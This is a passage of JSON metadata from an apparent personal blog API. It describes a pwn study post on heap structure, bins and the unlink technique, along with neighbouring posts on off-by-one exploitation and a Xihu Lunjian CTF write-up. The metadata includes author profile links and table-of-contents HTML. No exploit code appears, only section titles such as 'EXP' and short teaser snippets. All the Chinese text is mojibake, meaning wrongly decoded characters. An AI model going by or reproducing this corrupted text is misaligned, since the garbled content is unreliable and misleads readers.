†åˆ™æ˜¯åœ¨ç¨‹åºæ‰§è¡Œæ—¶éœ€è¦æ‰ä¼šåˆ†é…ï¼ˆç”±mallocã€allocã€reallocå‡½æ•°åˆ†é…å†…å­˜åå‡ºç°ï¼‰ã€‚ å †å…¶å®å°±æ˜¯ç¨‹åºè™šæ‹Ÿåœ°å€ç©ºé—´çš„ä¸€å—è¿ç»­çš„çº¿æ€§åŒºåŸŸï¼Œç”Ÿé•¿æ–¹å‘...","link":"","photos":[],"count_time":{"symbolsCount":"4.8k","symbolsTime":"4 mins."},"categories":[{"name":"pwn","slug":"pwn","count":3,"path":"api/categories/pwn.json"}],"tags":[{"name":"ç¬”è®°","slug":"ç¬”è®°","count":3,"path":"api/tags/ç¬”è®°.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E4%BB%80%E4%B9%88%E6%98%AF%E5%A0%86\"><span class=\"toc-text\">ä»€ä¹ˆæ˜¯å †</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%A0%86%E7%9A%84%E5%9F%BA%E6%9C%AC%E7%BB%93%E6%9E%84\"><span class=\"toc-text\">å †çš„åŸºæœ¬ç»“æ„</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#bins\"><span class=\"toc-text\">bins</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#Unlink%E6%9C%BA%E5%88%B6\"><span class=\"toc-text\">Unlinkæœºåˆ¶</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%A6%82%E4%BD%95%E8%A7%A6%E5%8F%91unlink\"><span class=\"toc-text\">å¦‚ä½•è§¦å‘unlink</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%AE%9E%E6%93%8D\"><span class=\"toc-text\">å®æ“</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%80%9D%E8%B7%AF\"><span class=\"toc-text\">æ€è·¯</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#EXP\"><span class=\"toc-text\">EXP</span></a></li></ol></li></ol>","author":{"name":"Krito","slug":"blog-author","avatar":"https://i.loli.net/2021/05/05/GFiJQZM1pxK3AyC.jpg","link":"/","description":"ä¸è¦ç­‰å¾…ï¼Œæ—¶æœºæ°¸è¿œä¸ä¼šæ°åˆ°å¥½å¤„ã€‚","socials":{"github":"https://github.com/Eli0t-g","twitter":"https://twitter.com/home","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"https://www.zhihu.com/people/wu-sheng-85-17-66","csdn":"https://blog.csdn.net/qq_52053150?spm=1000.2115.3001.5343","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"off-by-one","uid":"bd9db8b2380b14fbad4621ba09b4c803","slug":"off-by-one","date":"2021-12-03T13:24:02.000Z","updated":"2021-12-26T12:50:48.560Z","comments":true,"path":"api/articles/off-by-one.json","keywords":null,"cover":"https://s2.loli.net/2021/12/26/8dARZTCroeUzIg5.jpg","text":"ä»‹ç»off-by-one æŒ‡ç¨‹åºå‘ç¼“å†²åŒºä¸­å†™å…¥æ—¶ï¼Œå†™å…¥çš„å­—èŠ‚æ•°è¶…è¿‡äº†è¿™ä¸ªç¼“å†²åŒºæœ¬èº«æ‰€ç”³è¯·çš„å­—èŠ‚æ•°å¹¶ä¸”åªè¶Šç•Œäº†ä¸€ä¸ªå­—èŠ‚ã€‚è¿™ä¸ªå­—èŠ‚å¯èƒ½æ˜¯ä»»æ„å¯æ§çš„æˆ–è€…æ˜¯NULLå­—èŠ‚ã€‚ä»¥ä¸‹æ˜¯å¯¹ä¸¤ç§æƒ…å†µçš„åˆ©ç”¨æ–¹æ³• æº¢å‡ºå­—èŠ‚ä¸ºå¯æ§åˆ¶ä»»æ„å­—èŠ‚ï¼šé€šè¿‡ä¿®æ”¹å¤§å°é€ æˆå—ç»“æ„ä¹‹é—´å‡ºç°é‡å ï¼Œä»è€Œæ³„éœ²å…¶ä»–å—æ•°æ®ï¼Œæˆ–æ˜¯è¦†ç›–...","link":"","photos":[],"count_time":{"symbolsCount":"4.4k","symbolsTime":"4 mins."},"categories":[{"name":"å­¦ä¹ è®°å½•","slug":"å­¦ä¹ è®°å½•","count":3,"path":"api/categories/å­¦ä¹ è®°å½•.json"}],"tags":[{"name":"pwn","slug":"pwn","count":7,"path":"api/tags/pwn.json"}],"author":{"name":"Krito","slug":"blog-author","avatar":"https://i.loli.net/2021/05/05/GFiJQZM1pxK3AyC.jpg","link":"/","description":"ä¸è¦ç­‰å¾…ï¼Œæ—¶æœºæ°¸è¿œä¸ä¼šæ°åˆ°å¥½å¤„ã€‚","socials":{"github":"https://github.com/Eli0t-g","twitter":"https://twitter.com/home","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"https://www.zhihu.com/people/wu-sheng-85-17-66","csdn":"https://blog.csdn.net/qq_52053150?spm=1000.2115.3001.5343","juejin":"","customs":{}}},"feature":true},"next_post":{"title":"è¥¿æ¹–è®ºå‰‘pwnå¤ç°","uid":"08ca8a643d07b9ceeb8a1eb3cf2f50b4","slug":"è¥¿æ¹–è®ºå‰‘pwnå¤ç°","date":"2021-11-22T13:19:10.000Z","updated":"2021-11-22T23:24:05.390Z","comments":true,"path":"api/articles/è¥¿æ¹–è®ºå‰‘pwnå¤ç°.json","keywords":null,"cover":"https://i.loli.net/2021/11/23/3mXuv9PTqLHU726.jpg","text":" ç¬¬ä¸€æ¬¡å‚åŠ è¥¿æ¹–è®ºå‰‘ï¼ŒæŠ€æœ¯ä¸å¤Ÿï¼Œä¸€é¢˜æ²¡å‡ºï¼Œå¸Œæœ›æ˜å¹´èƒ½å¤Ÿå‡ºä¸ªä¸¤ä¸‰é“ blindå¬darryğŸ‘´è¯´è¿œç«¯çš„libcè¢«é­”æ”¹äº†ï¼Œå¯¹ä¸ä¸Šï¼ŒåŠ ä¸Šæ²¡æœ‰è¿œç«¯ç¯å¢ƒï¼Œæ‰€ä»¥æˆ‘å°±è®²ä¸€ä¸‹æœ¬åœ°å¦‚ä½•æ‰“é€šçš„ã€‚ï¼ˆå…¨ç¨‹darryğŸ‘´è®²è§£ï¼‰ æˆ‘ä¸€å¼€å§‹æ²¡æ³¨æ„åˆ°å¼€äº†NXä¿æŠ¤ï¼Œæ‰€ä»¥æƒ³åˆ©ç”¨æ„é€ readå‡½æ•°è®©å‡½æ•°è·³è½¬æ‰§è¡Œshellc...","link":"","photos":[],"count_time":{"symbolsCount":"5.8k","symbolsTime":"5 mins."},"categories":[{"name":"PWN","slug":"PWN","count":2,"path":"api/categories/PWN.json"}],"tags":[{"name":"wp","slug":"wp","count":2,"path":"api/tags/wp.json"}],"author":{"name":"Krito","slug":"blog-author","avatar":"https://i.loli.net/2021/05/05/GFiJQZM1pxK3AyC.jpg","link":"/","description":"ä¸è¦ç­‰å¾…ï¼Œæ—¶æœºæ°¸è¿œä¸ä¼šæ°åˆ°å¥½å¤„ã€‚","socials":{"github":"https://github.com/Eli0t-g","twitter":"https://twitter.com/home","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"https://www.zhihu.com/people/wu-sheng-85-17-66","csdn":"https://blog.csdn.net/qq_52053150?spm=1000.2115.3001.5343","juejin":"","customs":{}}}}}